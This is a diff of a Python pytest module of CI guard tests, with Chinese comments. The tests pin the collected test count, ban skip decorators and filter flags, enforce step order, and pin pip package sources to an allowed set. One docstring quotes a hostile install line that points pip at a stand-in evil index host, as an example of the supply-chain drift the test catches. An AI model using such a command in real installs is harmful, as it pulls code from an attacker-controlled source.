# Task 2 fix-round-1 scoped diff (snapshot before fix -> current)

now: bytes 31379 LF 588 CRLF 0 sha 19d335a1c15a
was: bytes 17032 LF 352 CRLF 0 sha 69f74974c2e1

@@ -15,9 +15,21 @@
    实测 100% LF，工作树却 LF/CRLF/MIXED 三态并存。没有 `.gitattributes` 时，下一台
    `autocrlf=false` 的机器（Linux 默认）可以把 CRLF 字节写进 index。
 
-自我存续子钉 `test_the_gate_module_itself_is_collected` 抓的是"门还在场但哑了"（被 skip、被
-marker 摘空、常数被人凑）；它**抓不到**门自己被改名或删除，那是规格 §14 L6 登记的不可消除
-自指盲区，别把它当已解决。
+自我存续是**两枚**钉、各守一面（规格 §16 卡 H 把原来混写成一件事的那句拆开了）：
+
+* `test_the_gate_module_itself_is_collected` 守"本文件贡献了几枚"——抓改名、抓摘走整枚用例、
+  抓常数被人凑。它**抓不到哑掉的门**：`--collect-only` 对 skip / skipif / unittest.skip 标记
+  照样打印 node id（独立评审实测 4 枚、rc=0），被哑掉的门在枚数面上完全隐形。
+* `test_the_gate_module_itself_carries_no_skip_or_xfail_decorator` 守后一半——直接扫本文件自己的
+  字节，任何哑门装饰器都不许出现。代价说清楚：这枚钉只看本文件，别的门文件被哑掉归它们自己的
+  账；而"本文件被改名或整枚删除"两枚钉都覆盖不到，那是规格 §14 L6 登记的不可消除自指盲区，
+  别把它当已解决。
+
+ci.yml 类门的共同口径：所有对**命令**的匹配都先在 `_step_script()`（剥掉 `#` 注释行）上做。
+原因不是洁癖——计划要求树上留一句解释"`python -m unittest discover` 那一步已删除"的注释，而
+`_job_steps` 会把两枚 step **之间**的注释归进前一枚 step，拿原文匹配命令的门因此会永远红在错误
+的 step 上。唯一例外是 `test_step_ordering_still_explains_itself` 的文字存在半边：它的宾语正是
+注释本身，必须看原文。
 """
 from __future__ import annotations
 
@@ -30,7 +42,6 @@ from pathlib import Path
 
 BACKEND_DIR = Path(__file__).resolve().parents[1]
 REPO_ROOT = BACKEND_DIR.parent
-TESTS_DIR = BACKEND_DIR / "tests"
 CI_FILE = REPO_ROOT / ".github" / "workflows" / "ci.yml"
 GITATTRIBUTES_FILE = REPO_ROOT / ".gitattributes"
 BASELINE_NODE_IDS = (REPO_ROOT / ".superpowers" / "sdd" / "ENTERPRISE_B0_PLAN"
@@ -69,8 +80,8 @@ def _per_module(ids: list[str]) -> "dict[str, int]":
     return out
 
 
-# 常数在 Step 5 按实测回写：1316 是 Task 1 的基线，本文件自己还要贡献 13 枚。
-EXPECTED_COLLECTED = 1329
+# 常数在修复轮 1 重新实测回写：1316 是 Task 1 的基线，本文件现在贡献 15 枚（卡 H / 卡 I 各加一枚）。
+EXPECTED_COLLECTED = 1331
 
 
 def test_collected_count_matches_the_pinned_number():
@@ -90,13 +101,41 @@ def test_collected_count_matches_the_pinned_number():
 
 
 def test_the_gate_module_itself_is_collected():
-    """自我存续：不依赖总数，只盯"本文件贡献了几枚"。凑总数、加 skip 都会在这里红。"""
+    """自我存续（卡 H 的 (a) 半边）：不依赖总数，只盯"本文件贡献了几枚"。
+
+    改名、摘走整枚用例、把常数被人凑都会在这里红。**加 skip 不会** —— `--collect-only` 照打
+    node id，那一面由 `test_the_gate_module_itself_carries_no_skip_or_xfail_decorator` 守。
+    """
     mine = [node_id for node_id in _collected() if node_id.startswith(f"{OWN_MODULE}::")]
     assert sorted(mine) == sorted(
         f"{OWN_MODULE}::{name}" for name in _OWN_TEST_NAMES), (
         f"门自己被摘了或哑了：本文件应有 {len(_OWN_TEST_NAMES)} 枚，实收 {len(mine)} 枚")
 
 
+#: 哑门装饰器的形状：at 号 + 点分段名 + skip / xfail 词干（pytest.mark.skip、
+#: pytest.mark.skipif(...)、unittest.skip(...)、pytest.mark.xfail 都在这一形里）。
+#: 刻意不在本文里把 at 号和词干写成一行示例 —— 那会被这枚模式扫到自己的源码行，门当场假红。
+#: 模式里用 `[ \t]` 而不是 `\s`，跨行不认：否则一枚正常装饰器的下一行只要以 skip 开头
+#: （本文件的 tokenize 循环里就有 `skip_next`）就会被当成装饰器命中。
+_MUTING_DECORATOR = re.compile(
+    "@" r"[ \t]*(?:[\w.]+[ \t]*\.)?(?:skip\w*|xfail\w*)", re.IGNORECASE)
+
+
+def test_the_gate_module_itself_carries_no_skip_or_xfail_decorator():
+    """自我存续（卡 H 的 (b) 半边）：本文件字节内不许出现任何哑门装饰器。
+
+    为什么必须是机器判据而不是口径：枚数钉对 skip 类标记天生瞎（独立评审实测：带三种哑门标记的
+    夹具照样被 `--collect-only` 打印 4 枚 node id、rc=0），所以随便给一枚门挂上 skip 标记就能让
+    本文件 15 枚全绿而其中任意几枚永不执行——正是规格 F6"门在场但哑了"。这一格把"哑掉"
+    变成可判定的。
+    """
+    source = Path(__file__).resolve().read_bytes().decode("utf-8", "replace")
+    offenders = [match.group(0) for match in _MUTING_DECORATOR.finditer(source)]
+    assert not offenders, (
+        f"本门文件里出现 {len(offenders)} 枚哑门装饰器：{offenders[:5]}。"
+        f"收集面枚数对它们无感，job 可以是绿的而门不再执行")
+
+
 def test_collection_measurement_counts_node_ids_not_the_summary_line():
     """解析器自己是判据的一部分：它必须能认出「尾行文句不算一枚」。
 
@@ -147,39 +186,144 @@ def _job_steps(text: str, job: str) -> "list[str]":
     return [block[a:b] for a, b in zip(cuts, cuts[1:])]
 
 
+_STEP_COMMENT_LINE = re.compile(r"^[ \t]*#")
+
+
+def _step_script(step: str) -> str:
+    """把一段 step 原文里的 `#` 注释行整行剥掉，只留下会真正执行的正文。
+
+    所有对**命令**的匹配都必须先过这里，原因是 I-1 那颗地雷：计划明确要求 ci.yml 里留一句
+    "原既有步 `python -m unittest discover` 已删除"的注释（§5.2 的两条顺序理由之一），而
+    `_job_steps` 把两枚 step **之间**的注释归进前一枚 step。不剥注释的话：
+      * `test_backend_contracts_has_no_unittest_discover_step` 在一次完全正确的 Task 3 之后
+        仍然红，而且红在 `validate_demo_assets` 那一步上（它把注释当成了命令）；
+      * 锚点识别同理会被注释污染。
+    只剥整行注释，不动行尾内联 `#` —— 内联那半由 `_pip_package_tokens()` 自己按 `#` 切。
+    唯一的例外是 `test_step_ordering_still_explains_itself` 的文字存在半边：它的宾语正是注释。
+    """
+    return "\n".join(line for line in step.splitlines()
+                     if not _STEP_COMMENT_LINE.match(line))
+
+
+_TEST_RUN_MARKER = re.compile(r"^\s*(?:-\s+)?run:", re.MULTILINE)
+#: 安装步要求的标量形态：`run: |` 字面块（`|-` / `|+` 同认）。折叠标量 `>-` 下 YAML 语义是一行、
+#: 原文却是好几行，按物理行的 tokenize 与 YAML 语义分叉，续行的包名会整体消失（卡 I 的第三个假绿）。
+_LITERAL_BLOCK_RUN = re.compile(r"^\s*run:\s*\|", re.MULTILINE)
+#: 跑全目录的那枚主门。`(?!/)` 的意义见 `test_backend_contracts_runs_the_pytest_suite`。
+_SUITE_WIDE_PYTEST = re.compile(r"python -m pytest backend/tests(?!/)")
+
+
 def _test_runs(text: str, job: str) -> "list[str]":
-    return [step for step in _job_steps(text, job) if "run:" in step]
+    return [step for step in _job_steps(text, job) if _TEST_RUN_MARKER.search(_step_script(step))]
 
 
 def test_backend_contracts_has_no_unittest_discover_step():
-    runs = _test_runs(_ci_text(), BACKEND)
-    offenders = [step for step in runs if "unittest discover" in step]
+    offenders = [step for step in _test_runs(_ci_text(), BACKEND)
+                 if "unittest discover" in _step_script(step)]
     assert not offenders, (
         f"F1 复活：`backend-contracts` 里又出现 unittest 收集（{len(offenders)} 处）。"
-        f"裸 pytest 函数枚枚不收，而 job 可以是绿的")
+        f"裸 pytest 函数枚枚不收，而 job 可以是绿的\n"
+        f" offending step 正文（已剥注释）：{[s.strip()[:200] for s in offenders][:3]}")
 
 
 def test_backend_contracts_runs_the_pytest_suite():
-    """必须是"跑整个目录"的那一步，不是 SECA-20 那种跑单文件的子集。
+    """必须是"跑整个目录"的那一步，而且必须**没被过滤旗标缩成子集**。
 
     `(?!/)` 是这枚门的实质：只写 `"python -m pytest backend/tests" in step` 的话，
     SECA-20 那步（`backend/tests/test_secret_hygiene_contract.py`）子串命中 ⇒ 门在改造前就绿，
     而它要防的"主门被删掉"永远抓不到。
+
+    I-5 是另一半：光"命中一次目录级调用"不够 —— 同一步挂上 `-k` / `--ignore` / `--deselect` /
+    `-x` / `--lf` 之类旗标就只跑一个子集，收集数钉（B0-01）声称的那 1331 枚从此没有任何一步
+    真正执行过，而 15 枚门照样全绿。所以主门正文里一枚过滤旗标都不许出现。
     """
     runs = _test_runs(_ci_text(), BACKEND)
     suite_wide = [step for step in runs
-                  if re.search(r"python -m pytest backend/tests(?!/)", step)]
+                  if _SUITE_WIDE_PYTEST.search(_step_script(step))]
     assert suite_wide, (
         "主门不跑全量套件：B0-01 的收集数钉必须由这一步实际执行，而不是只写在文档里。"
         "注意 SECA-20 那枚单文件子集不算——它只跑 5 枚")
+    muted: "list[str]" = []
+    for step in suite_wide:
+        flags = _main_gate_filter_flags(_step_script(step))
+        if flags:
+            muted.append(f"{sorted(set(flags))} ← {step.strip()[:160]}")
+    assert not muted, (
+        "主门被过滤/短路旗标缩成了子集，收集数钉不再由这一步实际执行：\n" + "\n".join(muted))
+
+
+#: 把"跑整目录"缩成"跑一个子集"或让它提前短路的旗标（I-5 / R8 点名 `-k` `--ignore`
+#: `--deselect` `-x` `--lf` `--kf` `-m`，其余是同一族的其他写法/长名）。
+MAIN_GATE_FILTER_FLAGS = (
+    "-k", "-m", "-x", "--exitfirst", "--deselect", "--ignore", "--ignore-glob",
+    "--lf", "--last-failed", "--nf", "--new-first", "--ff", "--failed-first", "--kf",
+    "--co", "--collect-only", "--maxfail", "--sw", "--stepwise",
+)
+
+
+def _main_gate_filter_flags(script: str) -> "list[str]":
+    """主门正文里的过滤旗标 token。
+
+    先把 `python -m` / `python3 -m` 这枚**前缀**摘掉再 tokenize —— 不摘的话
+    `python -m pytest` 自带的 `-m` 会被当成 pytest 的 marker 表达式旗标，门一落地就假红。
+    `--opt` 与值之间允许任意个空格（`- m` 这种写法也一并剥掉），但 `-m "not slow"` 里
+    **第二枚** `-m` 必须留下 —— 反证台 D 段就是量这一对的。
+    `--flag=value` 与 `--flag value` 两种写法都认；`-q` 不是过滤旗标（它不改收集面）。
+    """
+    normalized = re.sub(r"\bpython[3]?(?:\.exe)?\s+-\s*m\s+", " ", script)
+    out: "list[str]" = []
+    for raw in normalized.replace("\n", " ").split():
+        token = raw.strip("\"'").rstrip(";,")
+        if not token:
+            continue
+        if token in MAIN_GATE_FILTER_FLAGS:
+            out.append(token)
+        else:
+            head = token.split("=", 1)[0]
+            if len(token.split("=", 1)) == 2 and head in MAIN_GATE_FILTER_FLAGS:
+                out.append(head)
+    return out
+
+
+#: 顺序钉的四枚锚点（规格 §5.1 的目标步骤序列）。谓词一律跑在 `_step_script()` 上。
+#: 第二位是"必需"标志：compose / pwsh / 扫描三枚缺席即红；主门标 `False` 是因为它的缺席由
+#: 门 5 归因（本枚不重复报同一个根因），在场时仍参与严格全序。详见该门的 docstring。
+_ORDER_ANCHORS: "tuple[tuple[str, bool, object], ...]" = (
+    ("SECA-20 扫描步", True, lambda s: "test_secret_hygiene_contract.py" in s),
+    ("主门（pytest 跑全目录）", False, lambda s: bool(_SUITE_WIDE_PYTEST.search(s))),
+    ("compose 校验步", True, lambda s: "docker compose" in s),
+    ("pwsh 语法校验步", True, lambda s: "deploy.ps1" in s),
+)
 
 
 def test_step_ordering_still_explains_itself():
-    """顺序的两条理由（§5.2）要用文字留在树上：它俩是"为什么不顺手挪一步"的唯一长期答案。"""
-    block = _job_block(_ci_text(), BACKEND)
+    """顺序的两条理由（§5.2）要用文字留在树上，而且**顺序本身必须为真**（I-4 / R8）。
+
+    原写法只断言"SECA-20"与"unittest"两个词在 job 块里出现过 —— 把扫描步挪到主门之后它照样绿，
+    而那正是 f6c67b5 之后唯一会让人"顺手挪一步"的失配。`_job_steps` 给的是有序段，所以判据
+    改成段索引的严格全序。文字存在那半边**保留**，而且必须看原文（注释正是它的宾语、不能剥）。
+    """
+    text = _ci_text()
+    block = _job_block(text, BACKEND)
     assert "SECA-20" in block and "unittest" in block, (
         "ci.yml 里解释扫描步为何排在主门之前的注释被删了：那正是 f6c67b5 那轮踩过的地方")
 
+    scripts = [_step_script(step) for step in _job_steps(text, BACKEND)]
+    anchors: "list[tuple[str, int]]" = []
+    absent: "list[str]" = []
+    for label, mandatory, probe in _ORDER_ANCHORS:
+        hits = [i for i, script in enumerate(scripts) if probe(script)]
+        if not hits:
+            assert not mandatory, (
+                f"顺序钉的必需锚点 `{label}` 在 ci.yml 里找不到：位置判据不能对『找不到』保持沉默")
+            absent.append(label)
+            continue
+        anchors.append((label, hits[0]))
+    order = [index for _, index in anchors]
+    assert len(set(order)) == len(order) and order == sorted(order), (
+        f"step 顺序被改动，§5.2 的两条理由不再成立：{' → '.join(f'{label}#{index}' for label, index in anchors)}"
+        f"（要求严格递增：扫描 < 主门 < compose < pwsh；缺席锚点 {absent}）")
+
 #: 除 requirements.txt 之外允许出现的 pip 参数 → (处数, 为什么它是豁免而不是偷懒)。
 #: 形状沿用 SECA-20 扫描门的 `EXEMPTIONS`：键不含行号，处数是计数，多一处少一处都红。
 PIP_INSTALL_EXEMPTIONS: "dict[str, tuple[int, str]]" = {
@@ -190,13 +334,13 @@ PIP_INSTALL_EXEMPTIONS: "dict[str, tuple[int, str]]" = {
 
 
 def _install_steps(text: str, job: str) -> "list[str]":
-    return [step for step in _test_runs(text, job) if "pip install" in step]
+    return [step for step in _test_runs(text, job) if "pip install" in _step_script(step)]
 
 
 def test_install_face_uses_requirements_txt_as_the_source():
     steps = _install_steps(_ci_text(), BACKEND)
     assert steps, "`backend-contracts` 没有任何安装步"
-    assert any("-r backend/requirements.txt" in step for step in steps), (
+    assert any("-r backend/requirements.txt" in _step_script(step) for step in steps), (
         "依赖又变成 YAML 里的手写清单：`f6c67b5` 的远端 ModuleNotFoundError 就是这么来的")
 
 
@@ -206,11 +350,16 @@ def _pip_package_tokens(step_texts: "list[str]") -> "list[str]":
     绝不拿整段 step 文本去 tokenize：那会把 YAML 注释里的中文词、`sentence-transformers`、
     `-r backend/requirements.txt` 里的 `requirements.txt` 全算成"未豁免参数"，门一落地就假红。
     带值选项（`-r` / `--index-url`）连值一起跳；含 `/` 的是路径不是包名。
+
+    口径的已知边界：**按物理行**认 `pip install`，所以折叠标量（`>-`）里续写到第二行的包名
+    根本不会出现在同一物理行 ⇒ tokenize 结果为空。这不是"没有额外参数"，而是这枚门哑了 ——
+    由 `test_extra_pip_arguments_are_exactly_the_exemption_table` 的地板 + `run: |` 形状钉兜住
+    （规格 §16 卡 I）。
     """
     takes_value = {"-r", "--requirement", "--index-url", "--extra-index-url", "-i", "-f", "--find-links"}
     out: "list[str]" = []
     for text in step_texts:
-        for line in text.splitlines():
+        for line in _step_script(text).splitlines():
             body = line.split("#", 1)[0]          # 注释先整段丢掉
             if "pip install" not in body:
                 continue
@@ -229,10 +378,72 @@ def _pip_package_tokens(step_texts: "list[str]") -> "list[str]":
     return out
 
 
+#: 安装面里**带来源语义**的选项（卡 I (3)）。包名钉只回答"装什么"，这一格回答"从哪儿装"。
+_PIP_SOURCE_OPTIONS = {
+    "-r": "requirement", "--requirement": "requirement",
+    "--index-url": "index", "-i": "index", "--extra-index-url": "index",
+}
+#: 钉住的来源**值**。写成显式集合而不是"任意 https 都行"：`torch` 这个名字在敌意镜像和 CPU
+#: pytorch 镜像上长得一模一样，只钉包名等于把发行源交给写 YAML 的那个人。
+ALLOWED_PIP_SOURCE_VALUES = (
+    "https://download.pytorch.org/whl/cpu",
+    "backend/requirements.txt",
+)
+
+
+def _pip_source_option_values(step_texts: "list[str]") -> "list[tuple[str, str]]":
+    """把安装面里 `--index-url` / `--extra-index-url` / `-r` 这类选项的 **(选项, 值)** 收出来。
+
+    `--opt value` 与 `--opt=value` 两种写法都认；口径与 `_pip_package_tokens` 一致（同一物理行、
+    注释先丢），因此 `run: |` 形状钉同样保护它 —— 折叠标量下第二行的值会看不见。
+    """
+    out: "list[tuple[str, str]]" = []
+    for text in step_texts:
+        for line in _step_script(text).splitlines():
+            body = line.split("#", 1)[0]
+            if "pip install" not in body:
+                continue
+            tokens = [raw.strip("\"'") for raw in body.split("pip install", 1)[1].split()]
+            cursor = 0
+            while cursor < len(tokens):
+                token = tokens[cursor]
+                if token.startswith("-") and "=" in token:
+                    option, _, value = token.partition("=")
+                    if option in _PIP_SOURCE_OPTIONS:
+                        out.append((option, value))
+                    cursor += 1
+                    continue
+                if token in _PIP_SOURCE_OPTIONS:
+                    if cursor + 1 < len(tokens):
+                        out.append((token, tokens[cursor + 1]))
+                        cursor += 2
+                    else:
+                        out.append((token, ""))        # 选项挂空 ⇒ 也当越界
+                        cursor += 1
+                    continue
+                cursor += 1
+    return out
+
+
 def test_extra_pip_arguments_are_exactly_the_exemption_table():
-    """三个方向都算违规（与 SECA-20 的 `_gate_offenders` 同判据）：多出来的、处数不等、死行。"""
+    """三个方向都算违规（与 SECA-20 的 `_gate_offenders` 同判据）：多出来的、处数不等、死行。
+
+    卡 I (2) 另加两枚地板，因为"tokenize 到 0 枚"和"确实没有额外参数"长得一模一样：
+      * 安装步必须是 `run: |` 字面块 —— 折叠标量下按物理行的 tokenize 与 YAML 语义分叉；
+      * tokenize 结果必须**非空**，空即红（红在"门哑了"，不是红在"CI 干净"）。
+    """
+    steps = _install_steps(_ci_text(), BACKEND)
+    folded = [step for step in steps if not _LITERAL_BLOCK_RUN.search(_step_script(step))]
+    assert not folded, (
+        f"{len(folded)} 枚安装步不是 `run: |` 字面块：折叠/单行标量里续行的包名会整体消失，"
+        f"豁免表钉会红在『死行』这个错误的理由上、或者干脆哑掉。第一段正文："
+        f"{[s.strip()[:160] for s in folded][:1]}")
+    tokens = _pip_package_tokens(steps)
+    assert tokens, (
+        "安装面 tokenize 出来是空的 —— 这不能读成『没有额外 pip 参数』，只能读成这枚门哑了"
+        "（卡 I (2) 的地板）。要么安装步根本没写 `pip install`，要么它不是 `run: |` 形态。")
     seen: "dict[str, int]" = {}
-    for token in _pip_package_tokens(_install_steps(_ci_text(), BACKEND)):
+    for token in tokens:
         seen[token] = seen.get(token, 0) + 1
     offenders: "list[str]" = []
     for token, count in sorted(seen.items()):
@@ -246,6 +457,23 @@ def test_extra_pip_arguments_are_exactly_the_exemption_table():
     assert not offenders, "安装面漂移：" + "；".join(offenders)
 
 
+def test_install_face_pip_source_values_are_pinned():
+    """卡 I (3)：`-r` / `--index-url` / `--extra-index-url` / `-i` 的**值**逐枚落在钉住的集合内。
+
+    评审量出的第一个假绿就在这一格：`pip install torch --index-url https://evil.example.com/simple`
+    在包名钉里只看到 `torch`，绿；而豁免行写的理由正是"选 CPU **pytorch 发行源**"——发行源本身
+    没人钉过。本枚与 `test_extra_pip_arguments_are_exactly_the_exemption_table` 的分工是
+    "装什么 / 从哪儿装"两维，缺一维都会放走一次真实的供应链漂移。
+    """
+    pairs = _pip_source_option_values(_install_steps(_ci_text(), BACKEND))
+    offenders = [f"`{option} {value}` 不在钉住的来源集合内"
+                 for option, value in pairs if value not in ALLOWED_PIP_SOURCE_VALUES]
+    assert not offenders, (
+        "安装面出现了没钉过的依赖真源/发行源：" + "；".join(offenders)
+        + f"\n钉住的是：{list(ALLOWED_PIP_SOURCE_VALUES)}"
+        + f"\n本次收到的 (选项, 值)：{pairs}")
+
+
 def test_every_exemption_row_states_why():
     for token, (count, why) in PIP_INSTALL_EXEMPTIONS.items():
         assert count >= 1, token
@@ -318,6 +546,8 @@ def test_eol_rules_are_a_no_op_for_the_current_tree():
             continue
         relative = raw.decode("utf-8", "replace")
         suffix = Path(relative).suffix.lower()
+        if suffix not in (".sh", ".ps1"):
+            continue                                # 先看后缀再读字节：313 枚文件含二进制
         path = REPO_ROOT / relative
         if not path.is_file():
             continue
@@ -326,24 +556,30 @@ def test_eol_rules_are_a_no_op_for_the_current_tree():
             checked += 1
             if b"\r" in body:
                 offenders.append(f"{relative} 含 CR，但规则要求 eol=lf")
-        elif suffix == ".ps1":
+        else:
             checked += 1
-            if body.count(b"\r\n") == 0:
-                offenders.append(f"{relative} 没有 CRLF，但规则要求 eol=crlf")
+            lf, crlf = body.count(b"\n"), body.count(b"\r\n")
+            # 混合行尾的 .ps1 会被规则改写：只"有 CRLF"不够，必须**每一枚** LF 都在 CRLF 里。
+            if lf != crlf:
+                offenders.append(
+                    f"{relative} 的 LF {lf} 枚 != CRLF {crlf} 枚 ⇒ 含裸 LF（混合行尾），"
+                    f"但规则要求整文件 eol=crlf")
     assert checked, "`.sh` / `.ps1` 一枚都不在面上：这条 no-op 证明退化成了空判"
     assert not offenders, "加规则会改动工作树：" + "；".join(offenders)
 
-#: 13 枚，逐枚点名，与本文件实际定义的 `def test_` 一一对应。判据不靠"遍历我自己"——
+#: 15 枚，逐枚点名，与本文件实际定义的 `def test_` 一一对应。判据不靠"遍历我自己"——
 #: 只遍历本模块的用例，对本文件被摘走任何东西都无感。
 _OWN_TEST_NAMES = (
     "test_collected_count_matches_the_pinned_number",
     "test_the_gate_module_itself_is_collected",
+    "test_the_gate_module_itself_carries_no_skip_or_xfail_decorator",
     "test_collection_measurement_counts_node_ids_not_the_summary_line",
     "test_backend_contracts_has_no_unittest_discover_step",
     "test_backend_contracts_runs_the_pytest_suite",
     "test_step_ordering_still_explains_itself",
     "test_install_face_uses_requirements_txt_as_the_source",
     "test_extra_pip_arguments_are_exactly_the_exemption_table",
+    "test_install_face_pip_source_values_are_pinned",
     "test_every_exemption_row_states_why",
     "test_gitattributes_carries_the_required_rules",
     "test_index_has_no_crlf_entries",
